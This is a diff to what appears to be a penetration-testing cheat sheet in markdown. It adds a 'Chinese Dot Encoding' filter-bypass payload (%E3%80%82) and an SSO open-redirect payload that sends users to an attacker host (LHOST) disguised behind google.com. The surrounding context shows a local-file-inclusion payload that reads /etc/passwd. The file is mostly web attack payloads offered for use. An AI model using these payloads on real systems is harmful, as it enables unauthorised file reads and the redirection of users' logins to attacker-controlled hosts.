@@ -2698,6 +2698,18 @@ http://<RHOST>/index.php?lang=/etc/passwd%00
 ...\.\
 ```
 
+### Chinese Dot Encoding
+
+```c
+%E3%80%82
+```
+
+#### Single Sign-On (SSO) Redirect
+
+```c
+https://<RHOST>/auth/sso/init/<username>@<--- CUT FOR BREVITY --->=https://google.com%E3%80%82<LHOST>/
+```
+
 ### php://filter Wrapper
 
 > https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb
